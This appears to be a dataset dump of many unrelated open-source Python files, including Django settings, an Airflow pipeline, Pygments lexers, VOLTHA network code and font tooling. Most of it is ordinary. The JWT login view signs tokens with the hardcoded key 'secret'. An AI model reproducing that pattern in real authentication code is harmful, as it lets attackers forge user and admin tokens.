def main():
    fetchDatas()


main()"
JD296	JD296-buildhzk.py	"# Generate a 'HZK' font file for the T5UIC1 DWIN LCD
# from multiple bdf font files.
# Note: the 16x16 glyphs are not produced
# Author: Taylor Talkington
# License: GPL

import bdflib.reader
import math

def glyph_bits(size_x, size_y, font, glyph_ord):
    asc = font[b'FONT_ASCENT']
    desc = font[b'FONT_DESCENT']
    bits = [0 for y in range(size_y)]

    glyph_bytes = math.ceil(size_x / 8)
    try:
        glyph = font[glyph_ord]
        for y, row in enumerate(glyph.data):
            v = row
            rpad = size_x - glyph.bbW
            if rpad < 0: rpad = 0
            if glyph.bbW > size_x: v = v >> (glyph.bbW - size_x) # some glyphs are actually too wide to fit!
            v = v << (glyph_bytes * 8) - size_x + rpad
            v = v >> glyph.bbX
            bits[y + desc + glyph.bbY] |= v
    except KeyError:
        pass

    bits.reverse()
    return bits

def marlin_font_hzk():
    fonts = [
        [6,12,'marlin-6x12-3.bdf'],
        [8,16,'marlin-8x16.bdf'],
        [10,20,'marlin-10x20.bdf'],
        [12,24,'marlin-12x24.bdf'],
        [14,28,'marlin-14x28.bdf'],
        [16,32,'marlin-16x32.bdf'],
        [20,40,'marlin-20x40.bdf'],
        [24,48,'marlin-24x48.bdf'],
        [28,56,'marlin-28x56.bdf'],
        [32,64,'marlin-32x64.bdf']
    ]

    with open('marlin_fixed.hzk','wb') as output:
        for f in fonts:
            with open(f[2], 'rb') as file:
                print(f'{f[0]}x{f[1]}')
                font = bdflib.reader.read_bdf(file)
                for glyph in range(128):
                    bits = glyph_bits(f[0], f[1], font, glyph)
                    glyph_bytes = math.ceil(f[0]/8)

                    for b in bits:
                        try:
                            z = b.to_bytes(glyph_bytes, 'big')
                            output.write(z)
                        except OverflowError:
                            print('Overflow')
                            print(f'{glyph}')
                            print(font[glyph])
                            for b in bits: print(f'{b:0{f[0]}b}')
                            return"
JD180	JD180-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = ""l, j F, Y""
TIME_FORMAT = ""h:i a""
DATETIME_FORMAT = ""j F, Y h:i a""
YEAR_MONTH_FORMAT = ""F, Y""
MONTH_DAY_FORMAT = ""j F""
SHORT_DATE_FORMAT = ""j.M.Y""
SHORT_DATETIME_FORMAT = ""j.M.Y H:i""
FIRST_DAY_OF_WEEK = 1  # (Monday)

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    ""%Y-%m-%d"",  # '2006-10-25'
    ""%m/%d/%Y"",  # '10/25/2006'
    ""%m/%d/%y"",  # '10/25/06'
    ""%d.%m.%Y"",  # '25.10.2006'
    ""%d.%m.%y"",  # '25.10.06'
    # ""%d %b %Y"",  # '25 Oct 2006'
    # ""%d %b, %Y"",  # '25 Oct, 2006'
    # ""%d %b. %Y"",  # '25 Oct. 2006'
    # ""%d %B %Y"",  # '25 October 2006'
    # ""%d %B, %Y"",  # '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'
    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'
    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'
    ""%d.%m.%Y %H:%M:%S"",  # '25.10.2006 14:30:59'
    ""%d.%m.%Y %H:%M:%S.%f"",  # '25.10.2006 14:30:59.000200'
    ""%d.%m.%Y %H:%M"",  # '25.10.2006 14:30'
    ""%d.%m.%y %H:%M:%S"",  # '25.10.06 14:30:59'
    ""%d.%m.%y %H:%M:%S.%f"",  # '25.10.06 14:30:59.000200'
    ""%d.%m.%y %H:%M"",  # '25.10.06 14:30'
    ""%m/%d/%Y %H:%M:%S"",  # '10/25/2006 14:30:59'
    ""%m/%d/%Y %H:%M:%S.%f"",  # '10/25/2006 14:30:59.000200'
    ""%m/%d/%Y %H:%M"",  # '10/25/2006 14:30'
    ""%m/%d/%y %H:%M:%S"",  # '10/25/06 14:30:59'
    ""%m/%d/%y %H:%M:%S.%f"",  # '10/25/06 14:30:59.000200'
    ""%m/%d/%y %H:%M"",  # '10/25/06 14:30'
]
DECIMAL_SEPARATOR = "".""
THOUSAND_SEPARATOR = "" ""
NUMBER_GROUPING = 3"
JD421	JD421-pipeline-combustiveis.py	"from airflow.models import Variable
from os import getenv, path
from datetime import datetime
from airflow import DAG
from airflow.providers.cncf.kubernetes.operators.spark_kubernetes import SparkKubernetesOperator
from airflow.providers.cncf.kubernetes.sensors.spark_kubernetes import SparkKubernetesSensor
from airflow.providers.cncf.kubernetes.operators.kubernetes_pod import KubernetesPodOperator

# [START env_variables]
SPARK_NAMESPACE = getenv(""SPARK_NAMESPACE"", ""processing"")
# [END env_variables]

# [START env_variables]
DAGS_FOLDER_PATH = path.dirname(__file__)
# [END env_variables]

# [START instantiate_dag]
with DAG(
    dag_id='pipeline_combustiveis',
    schedule_interval=None,
    start_date=datetime(2023, 1, 20),
    catchup=False,
    max_active_runs=1,
    tags=['combustiveis', 'kubernetes-pod-operator', 'spark-operator', 'k8s'],
) as dag:
# [END instantiate_dag]

    ingestion = KubernetesPodOperator(
        task_id=""ingestion"",
        name=""combustiveis-ingestion"",
        is_delete_operator_pod=True,
        namespace=SPARK_NAMESPACE,
        startup_timeout_seconds=120,
        pod_template_file=f""{DAGS_FOLDER_PATH}/pipeline-combustiveis-ingestion.yaml"",
        in_cluster=True,
        get_logs=True,
        env_vars= {
            ""SOURCE_URLS"" : Variable.get(""combustiveis_source_urls"")
        }
    )

    # use spark-on-k8s to operate against the data
    # containerized spark application
    # yaml definition to trigger process
    processing = SparkKubernetesOperator(
        task_id='processing',
        namespace=SPARK_NAMESPACE,
        application_file='pipeline-combustiveis-processing.yaml',
        do_xcom_push=True
    )

    # monitor spark application
    # using sensor to determine the outcome of the task
    # read     from xcom tp check the status [key & value] pair
    processing_status = SparkKubernetesSensor(
        task_id='processing_status',
        namespace=SPARK_NAMESPACE,
        application_name=""{{ task_instance.xcom_pull(task_ids='processing')['metadata']['name']}}"",
        attach_log=True
    )

    # [START task_sequence]
    ingestion >> processing >> processing_status
    # [END task_sequence]"
JD394	JD394-test_deny_policies.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import re

import pytest
from snippets.get_deny_policy import get_deny_policy
from snippets.list_deny_policies import list_deny_policy
from snippets.update_deny_policy import update_deny_policy

PROJECT_ID = os.environ[""IAM_PROJECT_ID""]
GOOGLE_APPLICATION_CREDENTIALS = os.environ[""IAM_CREDENTIALS""]


def test_retrieve_policy(
    capsys: ""pytest.CaptureFixture[str]"", deny_policy: str
) -> None:
    # Test policy retrieval, given the policy id.
    get_deny_policy(PROJECT_ID, deny_policy)
    out, _ = capsys.readouterr()
    assert re.search(f""Retrieved the deny policy: {deny_policy}"", out)


def test_list_policies(capsys: ""pytest.CaptureFixture[str]"", deny_policy: str) -> None:
    # Check if the created policy is listed.
    list_deny_policy(PROJECT_ID)
    out, _ = capsys.readouterr()
    assert re.search(deny_policy, out)
    assert re.search(""Listed all deny policies"", out)


def test_update_deny_policy(
    capsys: ""pytest.CaptureFixture[str]"", deny_policy: str
) -> None:
    # Check if the policy rule is updated.
    policy = get_deny_policy(PROJECT_ID, deny_policy)
    update_deny_policy(PROJECT_ID, deny_policy, policy.etag)
    out, _ = capsys.readouterr()
    assert re.search(f""Updated the deny policy: {deny_policy}"", out)"
JY542	JY542-ship.py	"import pygame


class Ship():
    """"""Класс для управления кораблем.""""""

    def __init__(self, ai_game):
        """"""Инициализирует корабль и задает его начальную позицию.""""""
        self.screen = ai_game.screen
        self.settings = ai_game.settings
        self.screen_rect = ai_game.screen.get_rect()

        # Загружает изображение корабля и получает прямоугольник.
        self.image = pygame.image.load('images/ship.bmp')
        self.rect = self.image.get_rect()
        # Каждый новый корабль появляется у нижнего края экрана.
        self.rect.midbottom = self.screen_rect.midbottom

        # Сохранение вещественной координаты центра корабля.
        self.x = float(self.rect.x)

        # Флаги перемещения
        self.moving_right = False
        self.moving_left = False

    def update(self):
        """"""Обновляет позицию корабля с учетом флагов.""""""
        if self.moving_right and self.rect.right < self.screen_rect.right:
            self.x += self.settings.ship_speed
        if self.moving_left and self.rect.left > 0:
            self.x -= self.settings.ship_speed

        # Обновление атрибута rect на основании self.x.
        self.rect.x = self.x

    def blitme(self):
        """"""Рисует корабль в текущей позиции.""""""
        self.screen.blit(self.image, self.rect)

    def center_ship(self):
        """"""Размещает корабль в центре нижней стороны.""""""
        self.rect.midbottom = self.screen_rect.midbottom
        self.x = float(self.rect.x)"
JY25	JY25-autumn.py	"""""""
    pygments.styles.autumn
    ~~~~~~~~~~~~~~~~~~~~~~

    A colorful style, inspired by the terminal highlighting style.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class AutumnStyle(Style):
    """"""
    A colorful style, inspired by the terminal highlighting style.
    """"""

    styles = {
        Whitespace:                 '#bbbbbb',

        Comment:                    'italic #aaaaaa',
        Comment.Preproc:            'noitalic #4c8317',
        Comment.Special:            'italic #0000aa',

        Keyword:                    '#0000aa',
        Keyword.Type:               '#00aaaa',

        Operator.Word:              '#0000aa',

        Name.Builtin:               '#00aaaa',
        Name.Function:              '#00aa00',
        Name.Class:                 'underline #00aa00',
        Name.Namespace:             'underline #00aaaa',
        Name.Variable:              '#aa0000',
        Name.Constant:              '#aa0000',
        Name.Entity:                'bold #800',
        Name.Attribute:             '#1e90ff',
        Name.Tag:                   'bold #1e90ff',
        Name.Decorator:             '#888888',

        String:                     '#aa5500',
        String.Symbol:              '#0000aa',
        String.Regex:               '#009999',

        Number:                     '#009999',

        Generic.Heading:            'bold #000080',
        Generic.Subheading:         'bold #800080',
        Generic.Deleted:            '#aa0000',
        Generic.Inserted:           '#00aa00',
        Generic.Error:              '#aa0000',
        Generic.Emph:               'italic',
        Generic.Strong:             'bold',
        Generic.Prompt:             '#555555',
        Generic.Output:             '#888888',
        Generic.Traceback:          '#aa0000',

        Error:                      '#F00 bg:#FAA'
    }"
JY123	JY123-objectPicker.py	"# A demo for the IDsObjectPicker interface.
import win32clipboard
import pythoncom
from win32com.adsi import adsi
from win32com.adsi.adsicon import *

cf_objectpicker = win32clipboard.RegisterClipboardFormat(CFSTR_DSOP_DS_SELECTION_LIST)


def main():
    hwnd = 0

    # Create an instance of the object picker.
    picker = pythoncom.CoCreateInstance(
        adsi.CLSID_DsObjectPicker,
        None,
        pythoncom.CLSCTX_INPROC_SERVER,
        adsi.IID_IDsObjectPicker,
    )

    # Create our scope init info.
    siis = adsi.DSOP_SCOPE_INIT_INFOs(1)
    sii = siis[0]

    # Combine multiple scope types in a single array entry.

    sii.type = (
        DSOP_SCOPE_TYPE_UPLEVEL_JOINED_DOMAIN | DSOP_SCOPE_TYPE_DOWNLEVEL_JOINED_DOMAIN
    )

    # Set uplevel and downlevel filters to include only computer objects.
    # Uplevel filters apply to both mixed and native modes.
    # Notice that the uplevel and downlevel flags are different.

    sii.filterFlags.uplevel.bothModes = DSOP_FILTER_COMPUTERS
    sii.filterFlags.downlevel = DSOP_DOWNLEVEL_FILTER_COMPUTERS

    # Initialize the interface.
    picker.Initialize(
        None,  # Target is the local computer.
        siis,  # scope infos
        DSOP_FLAG_MULTISELECT,  # options
        (""objectGUID"", ""displayName""),
    )  # attributes to fetch

    do = picker.InvokeDialog(hwnd)
    # Extract the data from the IDataObject.
    format_etc = (
        cf_objectpicker,
        None,
        pythoncom.DVASPECT_CONTENT,
        -1,
        pythoncom.TYMED_HGLOBAL,
    )
    medium = do.GetData(format_etc)
    data = adsi.StringAsDS_SELECTION_LIST(medium.data)
    for item in data:
        name, klass, adspath, upn, attrs, flags = item
        print(""Item"", name)
        print("" Class:"", klass)
        print("" AdsPath:"", adspath)
        print("" UPN:"", upn)
        print("" Attrs:"", attrs)
        print("" Flags:"", flags)


if __name__ == ""__main__"":
    main()"
JY329	JY329-task_04_2.py	"""""""
Задача №4

Доработаем класс Архив из задачи 2.

Добавьте методы представления экземпляра для программиста
и для пользователя.
""""""


# 01:06:40


class Archive:
    """"""
    При первом запуске создаёт экземпляр класса, при повторном - добавляет
    в архив прежние данные.
    """"""
    instance = None
    counts = []
    texts = []

    def __new__(cls, *args, **kwargs):
        if cls.instance is None:
            cls.instance = super().__new__(cls)
            # cls.instance.counts = []
            # cls.instance.texts = []
        else:
            cls.instance.counts.append(cls.instance.count)
            cls.instance.texts.append(cls.instance.text)
        return cls.instance

    def __init__(self, count, text):
        self.count = count
        self.text = text
        # self.counts.append(self.count)
        # self.texts.append(self.text)

    def __str__(self):
        c = self.instance.counts if self.instance.counts else 'Empty'
        t = self.instance.texts if self.instance.texts else 'Empty'
        return (f'value: {self.instance.count}, text: {self.instance.text} '
                f'value archive: {c}, text archive: {t}')

    def __repr__(self):
        return f""Archive({self.instance.count}, '{self.instance.text}')""


if __name__ == '__main__':
    d1 = Archive(1, 'a')
    print(d1.text, d1.texts)
    print(f'{d1}')
    print(f'{d1 = }')
    d2 = Archive(2, 'b')
    print(d2.text, d2.texts)
    print(f'{d2}')
    print(f'{d2 = }')
""""""
a []
value: 1, text: a value archive: Empty, text archive: Empty
d1 = self.instance.count = 1 self.instance.text = 'a' self.instance.counts = [] 
self.instance.texts = []
b ['a']
value: 2, text: b value archive: [1], text archive: ['a']
d2 = self.instance.count = 2 self.instance.text = 'b' self.instance.counts = [1]
self.instance.texts = ['a']
Process finished with exit code 0
""""""
# 1:13:30, 1:17:50"
JD254	JD254-config_event_bus.py	"# Copyright 2017-present Open Networking Foundation
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import structlog
from enum import Enum
from google.protobuf.json_format import MessageToDict
from google.protobuf.message import Message
from simplejson import dumps

from common.event_bus import EventBusClient
from voltha.core.config.config_proxy import CallbackType
from voltha.protos import third_party
from voltha.protos.events_pb2 import ConfigEvent, ConfigEventType

IGNORED_CALLBACKS = [CallbackType.PRE_ADD, CallbackType.GET,
                     CallbackType.POST_LISTCHANGE, CallbackType.PRE_REMOVE,
                     CallbackType.PRE_UPDATE]

log = structlog.get_logger()

class ConfigEventBus(object):

    __slots__ = (
        '_event_bus_client',  # The event bus client used to publish events.
        '_topic'  # the topic to publish to
    )

    def __init__(self):
        self._event_bus_client = EventBusClient()
        self._topic = 'model-change-events'

    def advertise(self, type, data, hash=None):
        if type in IGNORED_CALLBACKS:
            log.info('Ignoring event {} with data {}'.format(type, data))
            return

        if type is CallbackType.POST_ADD:
            kind = ConfigEventType.add
        elif type is CallbackType.POST_REMOVE:
            kind = ConfigEventType.remove
        else:
            kind = ConfigEventType.update

        if isinstance(data, Message):
            msg = dumps(MessageToDict(data, True, True))
        else:
            msg = data

        event = ConfigEvent(
            type=kind,
            hash=hash,
            data=msg
        )

        self._event_bus_client.publish(self._topic, event)
"
JD521	JD521-gzip.py	"from django.utils.cache import patch_vary_headers
from django.utils.deprecation import MiddlewareMixin
from django.utils.regex_helper import _lazy_re_compile
from django.utils.text import compress_sequence, compress_string

re_accepts_gzip = _lazy_re_compile(r""\bgzip\b"")


class GZipMiddleware(MiddlewareMixin):
    """"""
    Compress content if the browser allows gzip compression.
    Set the Vary header accordingly, so that caches will base their storage
    on the Accept-Encoding header.
    """"""

    def process_response(self, request, response):
        # It's not worth attempting to compress really short responses.
        if not response.streaming and len(response.content) < 200:
            return response

        # Avoid gzipping if we've already got a content-encoding.
        if response.has_header(""Content-Encoding""):
            return response

        patch_vary_headers(response, (""Accept-Encoding"",))

        ae = request.META.get(""HTTP_ACCEPT_ENCODING"", """")
        if not re_accepts_gzip.search(ae):
            return response

        if response.streaming:
            # Delete the `Content-Length` header for streaming content, because
            # we won't know the compressed size until we stream it.
            response.streaming_content = compress_sequence(response.streaming_content)
            del response.headers[""Content-Length""]
        else:
            # Return the compressed content only if it's actually shorter.
            compressed_content = compress_string(response.content)
            if len(compressed_content) >= len(response.content):
                return response
            response.content = compressed_content
            response.headers[""Content-Length""] = str(len(response.content))

        # If there is a strong ETag, make it weak to fulfill the requirements
        # of RFC 7232 section-2.1 while also allowing conditional request
        # matches on ETags.
        etag = response.get(""ETag"")
        if etag and etag.startswith('""'):
            response.headers[""ETag""] = ""W/"" + etag
        response.headers[""Content-Encoding""] = ""gzip""

        return response"
JD253	JD253-onu_equipment_alarm.py	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from voltha.protos.events_pb2 import AlarmEventType, AlarmEventSeverity, AlarmEventCategory
from voltha.extensions.alarms.adapter_alarms import AlarmBase


class OnuEquipmentAlarm(AlarmBase):
    """"""
    The ONU Equipment Alarm is reported by both the CircuitPack (ME #6) and
    the ONT-G (ME # 256) to indicate failure on an internal interface or
    failed self-test.

    For CircuitPack equipment alarms, the intf_id reported is that of the
    UNI's logical port number

    For ONT-G equipment alarms, the intf_id reported is that of the PON/ANI
    physical port number

    Note: Some ONUs may use this alarm to report a self-test failure or may
          may report it with a different alarm number specifically for a
          self-test failure.
    """"""
    def __init__(self, alarm_mgr, onu_id, intf_id):
        super(OnuEquipmentAlarm, self).__init__(alarm_mgr, object_type='onu equipment',
                                                alarm='ONU_EQUIPMENT',
                                                alarm_category=AlarmEventCategory.ONU,
                                                alarm_type=AlarmEventType.EQUIPTMENT,
                                                alarm_severity=AlarmEventSeverity.CRITICAL)
        self._onu_id = onu_id
        self._intf_id = intf_id

    def get_context_data(self):
        return {'onu-id': self._onu_id,
                'onu-intf-id': self._intf_id}"
JY438	JY438-__init__.py	"""""""Text field.""""""

import gws
import gws.base.database.sql as sql
import gws.base.database.model
import gws.types as t

from .. import scalar

gws.ext.new.modelField('text')


class SearchType(t.Enum):
    exact = 'exact'
    begin = 'begin'
    end = 'end'
    any = 'any'
    like = 'like'


class Search(gws.Data):
    type: SearchType
    minLength: int
    caseSensitive: bool


class SearchConfig(gws.Config):
    type: SearchType
    minLength: int = 0
    caseSensitive: bool = False


class Config(scalar.Config):
    textSearch: t.Optional[SearchConfig]


class Props(scalar.Props):
    pass


class Object(scalar.Object):
    attributeType = gws.AttributeType.str
    textSearch: t.Optional[Search]

    def configure(self):
        self.textSearch = None
        p = self.var('textSearch')
        if p:
            self.textSearch = Search(
                type=p.get('type', SearchType.exact),
                minLength=p.get('minLength', 0),
                caseSensitive=p.get('caseSensitive', False),
            )

    def sa_select(self, sel, user):
        sel = t.cast(sql.SelectStatement, sel)

        if not self.textSearch or not sel.search or not sel.search.keyword:
            return

        kw = sel.search.keyword
        so = self.textSearch
        if so.minLength and len(kw) < so.minLength:
            return

        mod = t.cast(gws.base.database.model.Object, self.model)
        fld = sql.sa.sql.cast(
            getattr(mod.sa_class(), self.name),
            sql.sa.String)

        if so.type == SearchType.exact:
            sel.keywordWhere.append(fld == kw)
        else:
            kw = sql.escape_like(kw)
            if so.type == 'any':
                kw = '%' + kw + '%'
            if so.type == 'begin':
                kw = kw + '%'
            if so.type == 'end':
                kw = '%' + kw

            if so.caseSensitive:
                sel.keywordWhere.append(fld.like(kw, escape='\\'))
            else:
                sel.keywordWhere.append(fld.ilike(kw, escape='\\'))"
JD165	JD165-websocket_headers.py	"# Copyright (c) Streamlit Inc. (2018-2022) Snowflake Inc. (2022)
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from typing import Dict, Optional

from streamlit import runtime
from streamlit.runtime.metrics_util import gather_metrics
from streamlit.runtime.scriptrunner import get_script_run_ctx
from streamlit.web.server.browser_websocket_handler import BrowserWebSocketHandler


@gather_metrics(""_get_websocket_headers"")
def _get_websocket_headers() -> Optional[Dict[str, str]]:
    """"""Return a copy of the HTTP request headers for the current session's
    WebSocket connection. If there's no active session, return None instead.

    Raise an error if the server is not running.

    Note to the intrepid: this is an UNSUPPORTED, INTERNAL API. (We don't have plans
    to remove it without a replacement, but we don't consider this a production-ready
    function, and its signature may change without a deprecation warning.)
    """"""
    ctx = get_script_run_ctx()
    if ctx is None:
        return None

    session_client = runtime.get_instance().get_client(ctx.session_id)
    if session_client is None:
        return None

    if not isinstance(session_client, BrowserWebSocketHandler):
        raise RuntimeError(
            f""SessionClient is not a BrowserWebSocketHandler! ({session_client})""
        )

    return dict(session_client.request.headers)"
JY478	JY478-mixins.py	"import json

from django.core.serializers.json import DjangoJSONEncoder
from django.http import HttpResponse
try:
    from django.utils.encoding import force_unicode as force_text  # Django < 1.5
except ImportError as e:
    from django.utils.encoding import force_text  # Django 1.5 / python3
from django.utils.functional import Promise
from django.utils.cache import add_never_cache_headers
from django.views.generic.base import TemplateView

import logging
logger = logging.getLogger(__name__)


class LazyEncoder(DjangoJSONEncoder):
    """"""Encodes django's lazy i18n strings
    """"""
    def default(self, obj):
        if isinstance(obj, Promise):
            return force_text(obj)
        return super(LazyEncoder, self).default(obj)


class JSONResponseMixin(object):
    is_clean = False

    def render_to_response(self, context):
        """""" Returns a JSON response containing 'context' as payload
        """"""
        return self.get_json_response(context)

    def get_json_response(self, content, **httpresponse_kwargs):
        """""" Construct an `HttpResponse` object.
        """"""
        response = HttpResponse(content,
                                content_type='application/json',
                                **httpresponse_kwargs)
        add_never_cache_headers(response)
        return response

    def post(self, *args, **kwargs):
        return self.get(*args, **kwargs)

    def get(self, request, *args, **kwargs):
        self.request = request
        response = None

        func_val = self.get_context_data(**kwargs)
        if not self.is_clean:
            assert isinstance(func_val, dict)
            response = dict(func_val)
            if 'error' not in response and 'sError' not in response:
                response['result'] = 'ok'
            else:
                response['result'] = 'error'
        else:
            response = func_val

        dump = json.dumps(response, cls=LazyEncoder)
        return self.render_to_response(dump)


class JSONResponseView(JSONResponseMixin, TemplateView):
    pass"
JD265	JD265-test_pon_port.py	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from voltha.adapters.adtran_onu.pon_port import PonPort
from mock import MagicMock
import pytest

## Test class PonPort init settings  ###############
def test_PonPort_inits():
    handler = MagicMock()
    handler.device_id = 100
    portnum = 1
    testponport = PonPort(handler, portnum)

    assert testponport._enabled is False
    assert testponport._valid is True
    assert testponport._handler is handler
    assert testponport._deferred is None
    assert testponport._port is None
    assert testponport._port_number == 1
    assert testponport._entity_id is None
    assert testponport._next_entity_id == PonPort.MIN_GEM_ENTITY_ID




## Test PonPort staticmethod #########
def test_create():
    handler = MagicMock()
    handler.device_id = 200
    port_no = 2
    testcreate = PonPort.create(handler, port_no)

    assert isinstance(testcreate, PonPort)
    assert testcreate._handler is handler
    assert testcreate._port_number is port_no





## Test PonPort @property #########
def test_PonPort_properties():
    handler = MagicMock()
    handler.device_id = 300
    port_no = 3
    testprop1 = PonPort(handler, port_no)

    assert testprop1.enabled is False
    assert testprop1.port_number == 3
    assert testprop1.entity_id is None
    assert testprop1.next_gem_entity_id == PonPort.MIN_GEM_ENTITY_ID
    assert testprop1.tconts == {}
    assert testprop1.gem_ports == {}

"
JY15	JY15-rnc.py	"""""""
    pygments.lexers.rnc
    ~~~~~~~~~~~~~~~~~~~

    Lexer for Relax-NG Compact syntax

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer
from pygments.token import Text, Comment, Operator, Keyword, Name, String, \
    Punctuation

__all__ = ['RNCCompactLexer']


class RNCCompactLexer(RegexLexer):
    """"""
    For RelaxNG-compact syntax.

    .. versionadded:: 2.2
    """"""

    name = 'Relax-NG Compact'
    url = 'http://relaxng.org'
    aliases = ['rng-compact', 'rnc']
    filenames = ['*.rnc']

    tokens = {
        'root': [
            (r'namespace\b', Keyword.Namespace),
            (r'(?:default|datatypes)\b', Keyword.Declaration),
            (r'##.*$', Comment.Preproc),
            (r'#.*$', Comment.Single),
            (r'""[^""]*""', String.Double),
            # TODO single quoted strings and escape sequences outside of
            # double-quoted strings
            (r'(?:element|attribute|mixed)\b', Keyword.Declaration, 'variable'),
            (r'(text\b|xsd:[^ ]+)', Keyword.Type, 'maybe_xsdattributes'),
            (r'[,?&*=|~]|>>', Operator),
            (r'[(){}]', Punctuation),
            (r'.', Text),
        ],

        # a variable has been declared using `element` or `attribute`
        'variable': [
            (r'[^{]+', Name.Variable),
            (r'\{', Punctuation, '#pop'),
        ],

        # after an xsd:<datatype> declaration there may be attributes
        'maybe_xsdattributes': [
            (r'\{', Punctuation, 'xsdattributes'),
            (r'\}', Punctuation, '#pop'),
            (r'.', Text),
        ],

        # attributes take the form { key1 = value1 key2 = value2 ... }
        'xsdattributes': [
            (r'[^ =}]', Name.Attribute),
            (r'=', Operator),
            (r'""[^""]*""', String.Double),
            (r'\}', Punctuation, '#pop'),
            (r'.', Text),
        ],
    }"
JD283	JD283-views.py	"from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.exceptions import AuthenticationFailed
from rest_framework.parsers import JSONParser
from .serializers import UserSerializer
from .models import User
import jwt
import datetime
from jwt import decode
from bson.objectid import ObjectId

import sys

from helpers.permissions import isUser

class RegisterView(APIView):
    def post(self, request):
        serializer = UserSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        serializer.save()
        return Response(serializer.data)


class LoginView(APIView):
    def post(self, request):
        email = request.data['email']
        password = request.data['password']

        user = User.objects.filter(email__exact=email).first()

        if user is None:
            raise AuthenticationFailed('User not found!')

        if not user.check_password(password):
            raise AuthenticationFailed('Incorrect password!')

        payload = {
            'id': str(user._id),
            'admin': user.is_superAdmin,
            'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=60),
            'iat': datetime.datetime.utcnow()
        }
        

        token = jwt.encode(payload, 'secret',
                           algorithm='HS256').decode('utf-8')

        response = Response()

        response.set_cookie(key='jwt', value=token, httponly=True)
        response.data = {
            'jwt': token
        }

        return response


class UserView(APIView):
    
    permission_classes = [isUser]

    def get(self, request):
        user = User.objects.filter(_id=ObjectId(request.account['id'])).first()
        serializer = UserSerializer(user)
        
        return Response(serializer.data)



class LogoutView(APIView):
    def post(self, request):
        response = Response()
        response.delete_cookie('jwt')
        response.data = {
            'message': 'success'
        }
        return response"
JD360	JD360-0001_initial.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# -*- coding: utf-8 -*-
# Generated by Django 1.9 on 2015-12-28 23:27
from __future__ import unicode_literals

from django.db import migrations, models
import django.db.models.deletion


class Migration(migrations.Migration):

    initial = True

    dependencies = [
    ]

    operations = [
        migrations.CreateModel(
            name='Choice',
            fields=[
                ('id', models.AutoField(
                    auto_created=True, primary_key=True, serialize=False,
                    verbose_name='ID')),
                ('choice_text', models.CharField(max_length=200)),
                ('votes', models.IntegerField(default=0)),
            ],
        ),
        migrations.CreateModel(
            name='Question',
            fields=[
                ('id', models.AutoField(
                    auto_created=True, primary_key=True, serialize=False,
                    verbose_name='ID')),
                ('question_text', models.CharField(max_length=200)),
                ('pub_date', models.DateTimeField(
                    verbose_name=b'date published')),
            ],
        ),
        migrations.AddField(
            model_name='choice',
            name='question',
            field=models.ForeignKey(
                on_delete=django.db.models.deletion.CASCADE,
                to='polls.Question'),
        ),
    ]"
JY366	JY366-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""heatmap.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
